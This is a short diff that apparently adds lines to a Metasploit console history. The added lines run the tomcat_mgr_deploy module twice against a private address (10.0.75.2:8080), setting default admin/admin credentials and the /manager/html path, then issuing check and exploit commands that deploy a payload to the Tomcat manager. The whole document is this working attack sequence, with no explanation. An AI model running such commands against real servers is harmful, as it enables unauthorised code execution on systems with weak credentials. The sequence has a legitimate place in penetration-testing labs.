@@ -273,3 +273,28 @@ exploit
 exploit
 exploit
 exit
+use exploit/multi/http/tomcat_mgr_deploy 
+show options
+set HttpPassword admin
+set HttpUsername admin
+set RHOST 10.0.75.2
+set RPORT 8080
+show targets
+set target 1
+exploit
+set path /manager/html
+exploit
+exit
+use exploit/multi/http/tomcat_mgr_deploy 
+show options
+set HttpPassword admin
+set HttpUsername admin
+set RHOST 10.0.75.2
+set RPORT 8080
+set path /manager/html
+show targets
+set target 1
+check
+exploit
+exit
+exit
